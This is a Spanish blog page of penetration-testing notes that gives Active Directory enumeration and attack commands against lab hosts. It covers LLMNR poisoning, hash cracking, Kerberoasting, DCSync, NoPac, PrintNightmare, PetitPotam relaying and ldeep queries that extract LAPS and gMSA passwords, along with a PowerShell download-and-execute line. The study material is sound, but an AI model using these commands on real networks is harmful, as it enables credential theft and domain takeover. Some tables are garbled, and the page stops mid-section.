<!DOCTYPE html><!-- Layout especÃ­fico para writeups en markdown. Muestra hero (si existe) y el contenido --><html lang="es" class="dark"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Writeup</title><script type="module">!function(){const t=localStorage.getItem("theme")||"dark";document.documentElement.classList.toggle("light","light"===t),document.documentElement.classList.toggle("dark","dark"===t)}();</script><link rel="stylesheet" href="/assets/apuntes.fBeTOWmP.css">
<link rel="stylesheet" href="/assets/apuntes.sk8r29IW.css"></head> <body class="bg-bg1 text-white"> <div class="min-h-screen flex flex-col"> <!-- Header reutiliza el componente global si estÃ¡ disponible --> <header class="w-full py-4"> <div class="container mx-auto flex items-center justify-between"> <a href="/" class="flex items-center gap-3"> <div> <div class="text-lg font-semibold">Angel Corral</div> <div class="text-xs text-slate-400">Informatica y Ciberseguridad</div> </div> </a> <nav class="flex items-center gap-6 text-sm"> <a href="/writeups">Writeups</a> <a href="/projects">Proyectos</a> <a href="/apuntes">Apuntes</a> <a href="/services">Servicios</a> <a href="/contact" class="px-3 py-1 rounded-md border">Contacto</a> <button id="theme-toggle" class="theme-toggle" aria-label="Cambiar tema" type="button"> <svg id="sun-icon" class="hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path> </svg> <svg id="moon-icon" class="block" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path> </svg> </button> <script type="module">!function(){const e=document.getElementById("theme-toggle"),t=document.getElementById("sun-icon"),s=document.getElementById("moon-icon"),d=document.documentElement;function c(){return localStorage.getItem("theme")||"dark"}function l(e){"light"===e?(d.classList.remove("dark"),d.classList.add("light"),t.classList.remove("hidden"),t.classList.add("block"),s.classList.remove("block"),s.classList.add("hidden")):(d.classList.remove("light"),d.classList.add("dark"),s.classList.remove("hidden"),s.classList.add("block"),t.classList.remove("block"),t.classList.add("hidden")),localStorage.setItem("theme",e)}l(c()),e.addEventListener("click",()=>{l("light"===c()?"dark":"light")})}();</script> </nav> </div> </header> <main class="container mx-auto px-6 py-10 flex-1"> <article class="max-w-3xl mx-auto">  <div class="prose prose-invert prose-xl max-w-none">   <article class="max-w-3xl mx-auto px-6"> <div class="mb-12"> <a href="/apuntes" class="text-sm text-slate-400 hover:text-accentBlue transition-colors">
â† Volver a Apuntes
</a> <h1 class="text-4xl font-bold bg-gradient-to-r from-accentBlue to-accentGreen text-transparent bg-clip-text mb-4"> Enumeracion y ataques AD </h1>  <div class="flex flex-wrap gap-3">  </div> </div> <div class="prose prose-projects prose-invert prose-xl max-w-none"> <h1 id="ï¸-guÃ­a-de-enumeraciÃ³n-y-ataques-en-active-directory">ğŸ›¡ï¸ GuÃ­a de EnumeraciÃ³n y Ataques en Active Directory</h1>
<p>Este documento es una <strong>cheat sheet traducida y mejorada</strong> para la enumeraciÃ³n y explotaciÃ³n de Active Directory.<br>
Incluye comandos desde <strong>Linux y Windows</strong>, con explicaciones claras y estructuradas por categorÃ­a.</p>
<hr>
<h2 id="-1-enumeraciÃ³n-inicial">ğŸ“Œ 1. EnumeraciÃ³n Inicial</h2>





























<table><thead><tr><th>Comando</th><th>DescripciÃ³n</th></tr></thead><tbody><tr><td><code>nslookup ns1.inlanefreight.com</code></td><td>Consulta DNS para descubrir el mapeo de IP â†” nombre de dominio.</td></tr><tr><td><code>sudo tcpdump -i ens224</code></td><td>Captura paquetes en la interfaz de red especificada.</td></tr><tr><td><code>sudo responder -I ens224 -A</code></td><td>Responde y analiza consultas LLMNR, NBT-NS y MDNS en modo pasivo.</td></tr><tr><td><code>fping -asgq 172.16.5.0/23</code></td><td>Barrido de ping sobre el segmento de red.</td></tr><tr><td><code>sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum</code></td><td>Escaneo Nmap con detecciÃ³n de SO, versiÃ³n, scripts y traceroute. Resultados guardados en archivo.</td></tr></tbody></table>
<hr>
<h2 id="-2-kerbrute-enumeraciÃ³n-de-usuarios">ğŸ”‘ 2. Kerbrute (EnumeraciÃ³n de Usuarios)</h2>

































<table><thead><tr><th>Comando</th><th>DescripciÃ³n</th></tr></thead><tbody><tr><td><code>sudo git clone https://github.com/ropnop/kerbrute.git</code></td><td>Clona el repositorio de Kerbrute.</td></tr><tr><td><code>make help</code></td><td>Lista opciones de compilaciÃ³n disponibles.</td></tr><tr><td><code>sudo make all</code></td><td>Compila binarios para mÃºltiples SO y arquitecturas.</td></tr><tr><td><code>./kerbrute_linux_amd64</code></td><td>Prueba el binario compilado.</td></tr><tr><td><code>sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute</code></td><td>Mueve el binario a una ruta accesible en el sistema.</td></tr><tr><td><code>./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results</code></td><td>Descubre usuarios del dominio usando una wordlist y exporta los resultados.</td></tr></tbody></table>
<hr>
<h2 id="ï¸-3-llmnrntb-ns-poisoning">ğŸ•µï¸ 3. LLMNR/NTB-NS Poisoning</h2>

































<table><thead><tr><th>Comando</th><th>DescripciÃ³n</th></tr></thead><tbody><tr><td><code>responder -h</code></td><td>Muestra ayuda y opciones disponibles en Responder.</td></tr><tr><td><code>hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt</code></td><td>Crackea hashes NTLMv2 capturados por Responder con Hashcat.</td></tr><tr><td><code>Import-Module .\Inveigh.ps1</code></td><td>Importa el mÃ³dulo Inveigh en PowerShell.</td></tr><tr><td><code>(Get-Command Invoke-Inveigh).Parameters</code></td><td>Muestra parÃ¡metros y funcionalidades de Inveigh.</td></tr><tr><td><code>Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y</code></td><td>Inicia Inveigh con spoofing LLMNR &#x26; NBNS, salida en consola y archivo.</td></tr><tr><td><code>.\Inveigh.exe</code></td><td>Ejecuta la versiÃ³n en C# de Inveigh.</td></tr></tbody></table>
<p>| Deshabilita NBT-NS en Windows. |</p>
<hr>
<h2 id="-4-password-spraying--polÃ­ticas-de-contraseÃ±as">ğŸ” 4. Password Spraying &#x26; PolÃ­ticas de ContraseÃ±as</h2>

















































<table><thead><tr><th>Comando</th><th>DescripciÃ³n</th></tr></thead><tbody><tr><td><code>#!/bin/bash   for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}; do echo $x;done</code></td><td>Enumera</td></tr><tr><td><code>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol</code></td><td>Enumera polÃ­tica de contraseÃ±as</td></tr><tr><td><code>rpcclient -U "" -N 172.16.5.5</code></td><td>ConexiÃ³n SMB nula para info de dominio.</td></tr><tr><td><code>rpcclient $> querydominfo</code></td><td>Enumera polÃ­tica de contraseÃ±as.</td></tr><tr><td><code>enum4linux -P 172.16.5.5</code></td><td>Extrae polÃ­tica de contraseÃ±as.</td></tr><tr><td><code>enum4linux-ng -P 172.16.5.5 -oA ilfreight</code></td><td>Enumera polÃ­tica y exporta en YAML/JSON.</td></tr><tr><td>`ldapsearch -h 172.16.5.5 -x -b â€œDC=INLANEFREIGHT,DC=LOCALâ€ -s sub â€*â€œ</td><td>grep -m 1 -B 10 pwdHistoryLength`</td></tr><tr><td><code>net accounts</code></td><td>Enumera polÃ­tica en Windows.</td></tr><tr><td><code>Import-Module .\PowerView.ps1</code></td><td>Importa PowerView.</td></tr><tr><td><code>Get-DomainPolicy</code></td><td>Extrae polÃ­tica con PowerShell.</td></tr></tbody></table>
<h2 id="ï¸-5-enumeraciÃ³n-de-controles-de-seguridad">ğŸ›¡ï¸ 5. EnumeraciÃ³n de Controles de Seguridad</h2>

































<table><thead><tr><th>Comando</th><th>DescripciÃ³n</th></tr></thead><tbody><tr><td><code>Get-MpComputerStatus</code></td><td>Revisa estado de Windows Defender.</td></tr><tr><td>`Get-AppLockerPolicy -Effective</td><td>select -ExpandProperty RuleCollections`</td></tr><tr><td><code>$ExecutionContext.SessionState.LanguageMode</code></td><td>Descubre modo de lenguaje en PowerShell.</td></tr><tr><td><code>Find-LAPSDelegatedGroups</code></td><td>Enumera grupos delegados de LAPS.</td></tr><tr><td><code>Find-AdmPwdExtendedRights</code></td><td>Chequea permisos extendidos en LAPS.</td></tr><tr><td><code>Get-LAPSComputers</code></td><td>Enumera equipos con LAPS habilitado.</td></tr></tbody></table>
<hr>
<h2 id="-6-enumeraciÃ³n-con-credenciales-vÃ¡lidas">ğŸ”‘ 6. EnumeraciÃ³n con Credenciales VÃ¡lidas</h2>
<p>Incluye <strong>xfreerdp, crackmapexec, smbmap, rpcclient, impacket, windapsearch, BloodHound</strong>, etc.<br>
ğŸ‘‰ Cada comando permite extraer usuarios, grupos, shares, sesiones activas y polÃ­ticas.</p>
<h2 id="-7-kerberoasting">ğŸ”¥ 7. Kerberoasting</h2>
<p>Incluye:</p>
<ul>
<li><code>GetUserSPNs.py</code> (impacket)</li>
<li><code>hashcat -m 13100</code></li>
<li><code>setspn.exe</code></li>
<li><code>Rubeus.exe kerberoast</code></li>
<li><code>mimikatz kerberos::list /export</code></li>
</ul>
<p>ğŸ‘‰ Se explica cÃ³mo solicitar TGS tickets, exportarlos y crackearlos offline.</p>
<hr>
<h2 id="-8-acl-enumeration--tÃ¡cticas">ğŸ“‚ 8. ACL Enumeration &#x26; TÃ¡cticas</h2>
<ul>
<li><code>Get-DomainObjectACL</code></li>
<li><code>Convert-NameToSid</code></li>
<li><code>Set-DomainUserPassword</code></li>
<li><code>Add-DomainGroupMember</code></li>
<li><code>Remove-DomainGroupMember</code></li>
</ul>
<p>ğŸ‘‰ Permite manipular permisos delegados en AD y persistir acceso.</p>
<hr>
<h2 id="-9-dcsync">ğŸ”„ 9. DCSync</h2>
<ul>
<li><code>mimikatz # lsadump::dcsync</code></li>
<li><code>secretsdump.py -just-dc</code></li>
<li>Variables <code>$sid</code> con PowerView</li>
</ul>
<p>ğŸ‘‰ Ataques para replicar hashes desde el Domain Controller.</p>
<hr>
<h2 id="-10-privileged-access">ğŸ° 10. Privileged Access</h2>
<p>Incluye tÃ©cnicas para:</p>
<ul>
<li>Enumerar <strong>Remote Desktop Users</strong> y <strong>Remote Management Users</strong>.</li>
<li><code>evil-winrm</code> para acceso remoto.</li>
<li><code>PowerUpSQL</code> para enumerar instancias SQL.</li>
<li><code>mssqlclient.py</code> de Impacket con <code>xp_cmdshell</code>.</li>
</ul>
<hr>
<h2 id="-11-nopac">âš¡ 11. NoPac</h2>
<p>ExplotaciÃ³n de <strong>Sam-The-Admin</strong>:</p>
<ul>
<li><code>scanner.py</code> para detectar vulnerabilidad.</li>
<li><code>noPac.py</code> para obtener SYSTEM shell o hacer DCSync.</li>
</ul>
<hr>
<h2 id="ï¸-12-printnightmare">ğŸ–¨ï¸ 12. PrintNightmare</h2>
<ul>
<li>Clonar exploit <code>CVE-2021-1675</code>.</li>
<li>Usar <code>rpcdump.py</code>.</li>
<li>Generar payload DLL con <code>msfvenom</code>.</li>
<li>Ejecutar exploit con <code>CVE-2021-1675.py</code>.</li>
</ul>
<hr>
<h2 id="-13-petitpotam">ğŸªŸ 13. PetitPotam</h2>
<ul>
<li><code>PetitPotam.py</code> para provocar autenticaciÃ³n NTLM.</li>
<li><code>ntlmrelayx.py</code> para relays a servicios ADCS.</li>
<li><code>gettgtpkinit.py</code> para tickets TGT con certificados.</li>
</ul>
<hr>
<h2 id="ï¸-14-misconfiguraciones-varias">ğŸ› ï¸ 14. Misconfiguraciones Varias</h2>
<ul>
<li><code>adidnsdump</code> para resolver registros DNS.</li>
<li><code>Get-DomainUser -UACFilter PASSWD_NOTREQD</code> para cuentas sin requerir contraseÃ±a.</li>
<li><code>ls \\domain\SYSVOL\</code> para revisar GPO scripts.</li>
</ul>
<hr>
<h2 id="-15-group-policy-enumeration--ataques">ğŸ§© 15. Group Policy Enumeration &#x26; Ataques</h2>
<ul>
<li><code>gpp-decrypt</code></li>
<li><code>crackmapexec -M gpp_autologin</code></li>
<li><code>Get-DomainGPO</code></li>
<li><code>Get-GPO -All</code></li>
</ul>
<hr>
<h2 id="-16-asreproasting">ğŸ”¥ 16. ASREPRoasting</h2>
<ul>
<li><code>Get-DomainUser -PreauthNotRequired</code></li>
<li><code>Rubeus.exe asreproast</code></li>
<li><code>hashcat -m 18200</code></li>
<li><code>kerbrute userenum -d</code></li>
</ul>
<hr>
<h2 id="-17-trust-relationships">ğŸŒ 17. Trust Relationships</h2>
<ul>
<li>
<p><strong>Child â†’ Parent Trusts</strong></p>
<ul>
<li><code>Get-ADTrust</code></li>
<li><code>Get-DomainTrust</code></li>
<li><code>mimikatz kerberos::golden</code></li>
</ul>
</li>
<li>
<p><strong>Cross-Forest</strong></p>
<ul>
<li><code>Rubeus.exe kerberoast /domain</code></li>
<li><code>GetUserSPNs.py -request -target-domain</code></li>
<li><code>bloodhound-python</code></li>
</ul>
</li>
</ul>
<hr>
<h2 id="-18-transferencia-de-archivos">ğŸ“¦ 18. Transferencia de Archivos</h2>





















<table><thead><tr><th>Comando</th><th>DescripciÃ³n</th></tr></thead><tbody><tr><td><code>sudo python3 -m http.server 8001</code></td><td>Levanta servidor HTTP en Linux.</td></tr><tr><td><code>IEX(New-Object Net.WebClient).downloadString('http://IP/SharpHound.exe')</code></td><td>Descarga archivo con PowerShell.</td></tr><tr><td><code>impacket-smbserver -ip ...</code></td><td>Monta servidor SMB con Impacket.</td></tr></tbody></table>
<h2 id="ï¸-enumeraciÃ³n-de-active-directory-con-ldeep">ğŸ›¡ï¸ EnumeraciÃ³n de Active Directory con <em>ldeep</em></h2>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">git</span><span style="color:#F1FA8C"> clone</span><span style="color:#F1FA8C"> https://github.com/franc-pentest/ldeep.git</span></span>
<span class="line"><span style="color:#8BE9FD">cd</span><span style="color:#F1FA8C"> ldeep</span></span>
<span class="line"><span style="color:#50FA7B">chmod</span><span style="color:#F1FA8C"> +x</span><span style="color:#F1FA8C"> ldeep.sh</span></span>
<span class="line"><span style="color:#50FA7B">./ldeep.sh</span></span></code></pre>
<p>(En Kali viene preinstalado).</p>
<p>ğŸ•µï¸ EnumeraciÃ³n y ExplotaciÃ³n
Cada mÃ³dulo de ldeep permite consultar informaciÃ³n distinta vÃ­a LDAP:</p>
<p>ğŸ”¹ Enumerar Computer Objects</p>
<p>Lista todas las cuentas de computadoras en el dominio.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> computers</span></span></code></pre>
<p>ğŸ”¹ Enumerar AD metadata</p>
<p>Muestra la particiÃ³n de configuraciÃ³n de AD.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> conf</span></span></code></pre>
<p>ğŸ”¹ Enumerar Delegations</p>
<p>Detecta configuraciones inseguras de delegaciÃ³n.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> delegations</span></span></code></pre>
<p>ğŸ”¹ Enumerar Domain Policy</p>
<p>Revela configuraciones crÃ­ticas de contraseÃ±as y bloqueos.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> domain_policy</span></span></code></pre>
<p>ğŸ”¹ Enumerar FSMO Roles</p>
<p>Identifica quÃ© DCs tienen roles FSMO.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> fsmo</span></span></code></pre>
<p>ğŸ”¹ Enumerar gMSA credentials</p>
<p>Obtiene credenciales de cuentas de servicio gestionadas.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> gmsa</span></span></code></pre>
<p>ğŸ”¹ Enumerar GPOs</p>
<p>Lista objetos de polÃ­ticas de grupo.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> gpo</span></span></code></pre>
<p>ğŸ”¹ Enumerar Groups</p>
<p>Muestra grupos importantes como Domain Admins.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> groups</span></span></code></pre>
<p>ğŸ”¹ Enumerar Machine Accounts</p>
<p>Enumera cuentas de equipos.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> machines</span></span></code></pre>
<p>ğŸ”¹ Enumerar OUs</p>
<p>Muestra unidades organizacionales.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> ou</span></span></code></pre>
<p>ğŸ”¹ Enumerar Certificate Services</p>
<p>Enumera ADCS para detectar abuso de plantillas inseguras.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> pkis</span></span></code></pre>
<p>ğŸ”¹ Enumerar Schema</p>
<p>Muestra atributos del esquema de AD.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> schema</span></span></code></pre>
<p>ğŸ”¹ Enumerar Certificate Templates</p>
<p>Lista plantillas de certificados (ESC1â€“ESC8).</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> templates</span></span></code></pre>
<p>ğŸ”¹ Enumerar Users</p>
<p>Lista todos los usuarios del dominio.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> users</span></span></code></pre>
<p>ğŸ”¹ Enumerar Kerberos pre-authentication</p>
<p>Detecta usuarios con preautenticaciÃ³n deshabilitada.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> users</span><span style="color:#F1FA8C"> nokrbpreauth</span></span></code></pre>
<p>ğŸ”¹ Enumerar SPNs</p>
<p>Muestra usuarios con SPNs asignados.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> users</span><span style="color:#F1FA8C"> spn</span><span style="color:#BD93F9"> -v</span></span></code></pre>
<p>ğŸ”¹ Enumerar LAPS</p>
<p>Obtiene contraseÃ±as LAPS almacenadas en AD.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> laps</span></span></code></pre>
<p>ğŸ”¹ Enumerar Memberships</p>
<p>Muestra todos los grupos a los que pertenece un usuario.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> memberships</span><span style="color:#F1FA8C"> usuario</span><span style="color:#BD93F9"> -r</span></span></code></pre>
<p>ğŸ”¹ Enumerar User Attributes</p>
<p>Muestra atributos sensibles (ej: userPassword).</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> search</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">(samaccountname=raj)</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C"> userPassword</span></span></code></pre>
<p>ğŸ”¹ Enumerar Identity</p>
<p>Confirma identidad y credenciales usadas.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">ldeep</span><span style="color:#F1FA8C"> ldap</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> user</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> Password@123</span><span style="color:#BD93F9"> -d</span><span style="color:#F1FA8C"> dominio.local</span><span style="color:#BD93F9"> -s</span><span style="color:#F1FA8C"> ldap://IP</span><span style="color:#F1FA8C"> whoami</span></span></code></pre>
<p>ğŸ”“ ExplotaciÃ³n</p>
<p>âš¡ Exploitation/Privilege Escalation</p>
<p>Agregar un usuario a Domain Admins:</p>
